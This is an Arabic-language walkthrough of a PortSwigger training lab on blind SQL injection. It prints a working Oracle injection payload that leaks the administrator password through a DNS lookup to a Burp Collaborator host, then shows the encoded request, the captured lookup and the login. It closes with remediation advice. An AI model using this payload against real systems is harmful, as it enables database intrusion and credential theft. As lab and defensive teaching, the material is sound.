# [Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

## **`الهدف`**
قم بتنفيذ هجوم `Blind SQLi` يقوم بإجراء استعلام `DNS` إلى `Burp Collaborator` بحيث يُسرب كلمة مرور  حساب `administrator` ثم قم بتسجيل الدخول إليه.
## **`خطوات الحل`**
**`ملاحظة هامة:`** لا يمكن حل هذا اللاب إلا باستعمال أداة `Burp Collaborator` والتي تتوفر فقط في النسخة المدفوعة من `Burp Suite`.

بمجرد الدخول إلى صفحة الموقع سنقوم بتحويل الطلب الرئيسي للدخول للموقع إلى `Repeater`

```http
GET / HTTP/2
Host: 0ae600fb030ea56f800aadae00370017.web-security-academy.net
Cookie: TrackingId=a0qXQyuohf35wSFT; session=d5GKvHyxGXRhVINOcS66Csi1PyAKJRnr
```

بعد ذلك سنقوم بحقن الـ `Payload` التالي في الـ `TrackingId` داخل `Inspector` مع وضع رابط الـ `Subdomain` الخاص بـ `Burp Collaborator` في موضعه.

```SQL
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

ليصبح كالتالي:
```http
GET / HTTP/2
Host: 0ae600fb030ea56f800aadae00370017.web-security-academy.net
Cookie: TrackingId=a0qXQyuohf35wSFT'%20UNION%20SELECT%20EXTRACTVALUE(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20%5b%20%3c!ENTITY%20%25%20remote%20SYSTEM%20%22http%3a%2f%2f'%7c%7c(SELECT%20password%20FROM%20users%20WHERE%20username%3d'administrator')%7c%7c'.efxq47radv52rxso83mt8mjkkbq3et2i.oastify.com%22%3e%20%25remote%3b%5d%3e')%2c'%2fl')%20FROM%20dual--; session=d5GKvHyxGXRhVINOcS66Csi1PyAKJRnr
```

ثم نقوم بإرسال الطلب ونتوجه إلى `Burp Collaborator` ونضغط على `Poll now` وسنجد تفاعل `DNS` قد تم تفعيله من سيرفر الواجهة الخلفية وسنجد أن المستخدم ظاهرًا ضمن الـ  `DNS subdomain` 
```
The Collaborator server received a DNS lookup of type A for the domain name guw8yta47ao7z9ehysl8.efxq47radv52rxso83mt8mjkkbq3et2i.oastify.com.  
  
The lookup was received from IP address 3.251.104.249:25808 at 2026-Nov-12 14:30:16.400 UTC.
```

لذلك سنقوم بنسخ كلمة المرور `guw8yta47ao7z9ehysl8` ثم نقوم بتسجيل الدخول إلى حساب `administrator:guw8yta47ao7z9ehysl8` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](./SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data.md)

ولكن بتعديل بسيط في النقطة الثانية من الترقيع حيث ستصبح:  
ويجب التحقق من مدخلات المستخدم ومطابقتها مع قائمة بيضاء محددة مسبقا قبل تمريرها إلى قاعدة البيانات، وبما أن قيمة الـ `TrackingId` داخل الـ `Cookie` تكون معروفة الهيكلة وتتكون فقط من حروف وأرقام `Alphanumeric` وبطول ثابت، فيجب ألا يتم قبول أي مدخل يخرج عن هذا النطاق مثل احتوائه على علامات اقتباس أو رموز خاصة أو بطول أكبر من المُحدد، ويقوم التطبيق برفض الطلب فوراً إذا كان المدخل غير صالح.

ويجب تطبيق سياسة تقييد الاتصالات الصادرة `Egress Filtering` على مستوى الجدار الناري `Firewall`، بحيث يتم منع سيرفر الويب من إجراء أي اتصالات صادرة `Outbound Connections` نحو شبكة الإنترنت الخارجية بشكل افتراضي تطبيقًا لمبدأ المنع الافتراضي `Default Deny`، والسماح للسيرفر فقط بالاتصال بالوجهات الخارجية الضرورية والمحددة مسبقاً عبر قائمة بيضاء صارمة `Strict Whitelist`، لمنع المهاجم من استغلال السيرفر للاتصال بخوادم خارجية يتحكم بها `OAST` لتأكيد الثغرات العمياء `Blind SQLi` أو تسريب البيانات `Out-of-band Data Exfiltration`.

ويجب سحب صلاحيات التنفيذ `Revoke Execute` من المستخدم العادي على الحزم `Packages` الخطيرة في `Oracle` التي تسمح بالاتصال الخارجي إذا لم تكن هناك حاجة ضرورية لها مثل `UTL_HTTP` و `UTL_INADDR`.

ويجب ضبط إعدادات قواعد البيانات ومكتبات معالجة الـ `XML` بداخلها بحيث تمنع استدعاء الكيانات الخارجية `Disable External Entities/DTDs`.
